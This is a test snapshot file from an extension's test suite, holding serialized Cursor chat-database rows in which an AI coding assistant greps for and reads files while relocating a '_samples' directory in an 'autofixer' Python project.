    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"bf6b0eea-d94d-4c87-acc7-a898f080cc4c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:03.074Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"b286ef2d-d39b-49ef-bc42-3377a530f734","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623","capabilityType":30,"thinking":{"text":"","signature":"O-OUYglndHdDy96cpByjem7z6uEa3Wv72aZDlsKaC_kKvbSWmzXZi6upgFFbeLRR0l3orK0CbVec52_nmE1ZdVS2gcwE2QfB0C9bG8lG1fzQUGGGYEx28aUPq95QNZc8gb1vbxyqjXuxDcdWOI9_h7VVcPwWM89XSVXtLa-ZL1hKNB23ld3WsI9I9KUCbKRvApfRIcBbs-czB-fgcAJDOqmAsG1PwZyMwQpboQoDXjyJsV_wL1CCSXas-0kCP2GKdiMR7kdPHlUaKDLvAHy3Seq0IIODgasE7hHsWp_0EI0C5JXCfNxzdxsnOQhcnkcC-Q9UoAOLM9cUt1Ug2AYXA-LRNRk6hgJ6G2gdmoahPf8kKXqEcryMkExrvYPeeK4GgFmC4F5bQTL4Xva8KWT8S3_j9z_dQL1iREHma7B9sI1bDbx6u3CqZdLFP4SOQQX8fDEySSpqZML041An-bHR6Im69kqvD2gts9PUcWYLjjjRlY8IMbtArLeBk-e-tPOJcm9tuEN_9DA4YH7yR_KNbOrC09oEnDQyjI7M-1QFYD_SroiojsiRWZnpqREp-e0RZFIQTteYuOFlF24k66vXzNeZ0xjdQw"},"thinkingDurationMs":2141}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-42 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:a2915804-4bfa-42ec-8984-5d0a8f295a0f",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"a2915804-4bfa-42ec-8984-5d0a8f295a0f","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:10.514Z","isQuickSearchQuery":false,"text":"Checking references to the \`_samples\` directory path that need updating:\\n","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623","symbolLinks":["{\\"symbolName\\":\\"_samples\\",\\"symbolSearchString\\":\\"_samples\\",\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"roughLineNumber\\":221}"]}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-43 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:b3dc23bf-da3f-45f4-a01d-ac170a73f955",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"b3dc23bf-da3f-45f4-a01d-ac170a73f955","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:10.656Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":41,"toolIndex":1,"modelCallId":"b091a238-6a19-4def-b3d5-5af3d688ed42","toolCallId":"tool_f0b48ecb-8783-4e48-8f97-e90595be870","status":"completed","rawArgs":"{\\"pattern\\": \\"_samples\\"}","name":"grep","params":"{\\"pattern\\":\\"_samples\\",\\"outputMode\\":\\"content\\",\\"caseInsensitive\\":false}","additionalData":{},"result":"{\\"success\\":{\\"pattern\\":\\"_samples\\",\\"path\\":\\".\\",\\"outputMode\\":\\"content\\",\\"workspaceResults\\":{\\"/Users/jonathanafek/src/autofixer\\":{\\"content\\":{\\"matches\\":[{\\"file\\":\\"./patchino/patchino/issue_processor.py\\",\\"matches\\":[{\\"lineNumber\\":238,\\"content\\":\\"        config_path = str(SCRIPT_PATH / \\\\\\"../_samples/samples.json\\\\\\")\\"}]},{\\"file\\":\\"./patchino/patchino/sampler.py\\",\\"matches\\":[{\\"lineNumber\\":221,\\"content\\":\\"    output_dir_path: str = str(SCRIPT_PATH / \\\\\\"../_samples\\\\\\")\\"},{\\"lineNumber\\":254,\\"content\\":\\"    samples += await _get_customer_report_samples(input_config)\\"},{\\"lineNumber\\":255,\\"content\\":\\"    samples += await _get_dataset_samples(input_config)\\"},{\\"lineNumber\\":275,\\"content\\":\\"    serialized_samples = []\\"},{\\"lineNumber\\":294,\\"content\\":\\"        serialized_samples.append(\\"},{\\"lineNumber\\":335,\\"content\\":\\"                \\\\\\"issues\\\\\\": serialized_samples,\\"},{\\"lineNumber\\":343,\\"content\\":\\"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\"},{\\"lineNumber\\":402,\\"content\\":\\"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\"}]},{\\"file\\":\\"./consumers/analyzer/tests/assets/python/improper_string_formatting/from_dataset/PennyLaneAI/sonarqube_report.json\\",\\"matches\\":[{\\"lineNumber\\":15899,\\"content\\":\\"      \\\\\\"message\\\\\\": \\\\\\"Return a value of type \\\\\\\\\\\\\\"list[TensorLike]\\\\\\\\\\\\\\" instead of \\\\\\\\\\\\\\"tuple\\\\\\\\\\\\\\" or update function \\\\\\\\\\\\\\"measure_with_samples\\\\\\\\\\\\\\" type hint.\\\\\\",\\"},{\\"lineNumber\\":138238,\\"content\\":\\"              \\\\\\"msg\\\\\\": \\\\\\"Change this argument; Function \\\\\\\\\\\\\\"process_samples\\\\\\\\\\\\\\" expects a different type\\\\\\"\\"},{\\"lineNumber\\":138254,\\"content\\":\\"      \\\\\\"message\\\\\\": \\\\\\"Change this argument; Function \\\\\\\\\\\\\\"process_samples\\\\\\\\\\\\\\" expects a different type\\\\\\",\\"}]},{\\"file\\":\\"./consumers/analyzer/tests/assets/java/hardcoded_secrets/from_dataset/pytorch_vision/checkmarx_report.json\\",\\"matches\\":[{\\"lineNumber\\":24355,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":24362,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":24370,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":24377,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":24400,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":24407,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":24415,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":24422,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25874,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25881,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25889,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25896,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25919,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25926,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25934,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":25941,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d684fd43.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27126,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27133,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_622a6e34.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27141,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27148,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_622a6e34.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27171,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27178,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_622a6e34.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27186,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":27193,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_622a6e34.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":37214,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":37221,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d917f0cc._evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":37229,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":37236,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_d917f0cc._evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":40037,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":40044,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_284fec67._evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":40052,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":40059,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_284fec67._evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48178,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48185,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_5dc40809.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48193,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48200,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_5dc40809.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48223,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48230,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_5dc40809.evaluate.num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48238,\\"content\\":\\"            \\\\\\"name\\\\\\": \\\\\\"num_processed_samples\\\\\\",\\"},{\\"lineNumber\\":48245,\\"content\\":\\"            \\\\\\"fullName\\\\\\": \\\\\\"CxPYNS_5dc40809.evaluate.num_processed_samples\\\\\\",\\"}]},{\\"file\\":\\"./services/datadog_postgres_agent/postgres/conf.yaml\\",\\"matches\\":[{\\"lineNumber\\":43,\\"content\\":\\"    query_samples:\\"},{\\"lineNumber\\":49,\\"content\\":\\"      collection_interval: 15  # Every 15 seconds, default: 10, This number cannot be smaller than query_samples configured collection_interval\\"}]}],\\"totalLines\\":54,\\"totalMatchedLines\\":54}}}}}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-44 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:9ee2f72e-88c1-4c65-89d7-0f2b87a024d6",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"9ee2f72e-88c1-4c65-89d7-0f2b87a024d6","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:10.656Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","serverBubbleId":"39c9e3ed-8f0f-4d31-9b81-081a8771c4f7","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623","capabilityType":30,"thinking":{"text":"","signature":"WEj4eGdYEfcR8P3whKpoEUCY9IY-wtXSb50uv7S2EDIMtWIfMTOpxIkMpFPH_k-DfGAOiFHbl7WxJ6jWAud-3eXyEeTxe9D0yekAcSul41vTNX86ey3ypyHPJ2jrAj7k52Q5vvJDETDNg-UmdlQ0g_4-dLBxP11Z2kEAKbk3VyQeceuhVEzVUWHvbi9kCNNmTMhQZzfjBnhhxZt21c4Rm0yJz_ES8aK-lGPfIDRQERmrJ-BxA2aGkfaIG3HUpuz8481B72XToCqDcFTsBImsU7-cN0CNr761SN2N3KW7PUfX-RKhTP__lKnNbpAI1QO2n7lMopHWSvtYxPDpN3MAwK2q8s5uhOP6nR_RwKUD-bHPCSkmK8bVhHvJ56FofWU_xMeJYZ6H-zF0V0vyKFHN9jUYTnTS9LFdGqwShX6_CCLjbOo1_5C_qhzujQSrlwL3Yl8t-Qu2mr80NTEurya1RDBZmiaJnrtunJ-qcm2m1hhGYHmTKQdlIGz3VHIWAvhLizZ3fAGJ8Qr18Z0JhAXmHPR6b4suDkltk4PZnSpcpEQfYLtyXoDQjuiCBkCz4E9w0xHVcGqJfjwhcyenA8BCAIpE-6avpoYD-nRUJj4lDYUmmjNlc49DQxC9af9Dg3mxJpnOKcU9nt-FG7CcDvRCjw0mcWTGEaiQtT5B-cHwfBhdZhb_MMyOagW93xNz5axp4NruXSYvC0JU-L589IiiPqYlvkKqkDTdv39qaxez5gGM1_ivxaaNJ6DWmn-Og_VPaAHlgK_qg-lyWmuGhvU_KfGhQGkTPsD_0ENVpZqijLWkFjJZ_83E5CvUt_3q6j5qMyD9DWgwevDi-rmKgURodiN4K_9lzW1x3CLYPdgj7q3iCC6cIVE6LDXykfUyiXdzBIeJptwez8i_20GY32VFy_GNO2TYsq4lJDa3GGeL_iNGIvdUAckAFlLXYELj_acqmrfGOe355emY1d_-_bfI3FB2IMvzElkPm4kVOgZXKRefnyVgvlI7GDiOymOAdoFfMQz4PWjOwMnzzk0bpVA"},"thinkingDurationMs":3643}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-45 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:2f4bac40-80e1-4033-a90c-2fbcbe4e3b7e",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"2f4bac40-80e1-4033-a90c-2fbcbe4e3b7e","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:22.869Z","isQuickSearchQuery":false,"text":"Moving sample files from \`patchino/_samples\` to the repo root and updating references. Checking the code structure first:\\n","usageUuid":"ee048cd7-6c01-42f5-9764-7b080f01b623"}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-46 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:72359e21-fcd5-4393-90bb-c4f218cc2cb2",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"72359e21-fcd5-4393-90bb-c4f218cc2cb2","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:23.153Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":40,"toolIndex":1,"modelCallId":"94793f8f-f6b8-4e9c-bb57-1b3ebcd7926e","toolCallId":"tool_335231e0-93f4-4366-9b3e-91ba11bebea","status":"completed","rawArgs":"{\\"target_file\\": \\"/Users/jonathanafek/src/autofixer/patchino/patchino/sampler.py\\", \\"offset\\": 1, \\"limit\\": 30}","name":"read_file","params":"{\\"targetFile\\":\\"/Users/jonathanafek/src/autofixer/patchino/patchino/sampler.py\\",\\"offset\\":1,\\"limit\\":30,\\"charsLimit\\":100000}","additionalData":{},"result":"{\\"contents\\":\\"from __future__ import annotations\\\\n\\\\nfrom typing import Annotated, Optional\\\\n\\\\nimport json\\\\nimport os\\\\nimport pathlib\\\\nimport pickle\\\\nimport random\\\\nimport tempfile\\\\nimport time\\\\nimport zipfile\\\\nfrom collections import defaultdict\\\\nfrom dataclasses import dataclass\\\\n\\\\nimport fire  # type: ignore[import-untyped]\\\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\\\nfrom annotated_types import Len\\\\nfrom dotenv import load_dotenv\\\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\\\nfrom pycommon.report.file_loader import FileLoader\\\\nfrom pycommon.report.issue import Issue\\\\nfrom pycommon.s3 import S3Access\\\\nfrom pydantic import BaseModel\\\\n\\\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\\\n    os.getenv(\\\\\\"DATASET_DATA_FOLDER_PATH\\\\\\", SCRIPT_PATH / \\\\\\"../../../dataset/data\\\\\\")\\",\\"numCharactersInRequestedRange\\":932,\\"offsetIsBiggerThanNumberOfLinesInFile\\":false,\\"totalLinesInFile\\":503}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-47 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:bbbe25bd-d09e-41f2-a5f3-ee8dab9da51c",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"bbbe25bd-d09e-41f2-a5f3-ee8dab9da51c","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:23.153Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":40,"toolCallId":"tool_f050a563-3dd0-4bd7-b493-c31fcb67656","toolIndex":2,"modelCallId":"94793f8f-f6b8-4e9c-bb57-1b3ebcd7926e","status":"completed","rawArgs":"{\\"target_file\\": \\"/Users/jonathanafek/src/autofixer/patchino/patchino/issue_processor.py\\", \\"offset\\": 1, \\"limit\\": 30}","name":"read_file","params":"{\\"targetFile\\":\\"/Users/jonathanafek/src/autofixer/patchino/patchino/issue_processor.py\\",\\"offset\\":1,\\"limit\\":30,\\"charsLimit\\":100000}","additionalData":{},"result":"{\\"contents\\":\\"# Configure the AI adapter to save the prompt metadata for this tool\\\\n# DO NOT MOVE THIS LINE OF CODE FROM HERE.\\\\n# The env var should be set as soon as the module gets loaded\\\\nfrom analyzer.ai_adapter.prompt import PromptCollector\\\\nfrom analyzer.fix_info import FalsePositiveFixInfo\\\\n\\\\nPromptCollector.enable_prompt_collector()\\\\n\\\\nfrom typing import Optional\\\\n\\\\nimport asyncio\\\\nimport inspect\\\\nimport json\\\\nimport logging\\\\nimport os\\\\nimport pickle\\\\nimport sys\\\\nfrom datetime import datetime\\\\nfrom pathlib import Path\\\\n\\\\nfrom analyzer.analysis import ANALYZERS, get_fix_info\\\\nfrom analyzer.code_checker import check_code_valid\\\\nfrom pycommon.report.fileutils 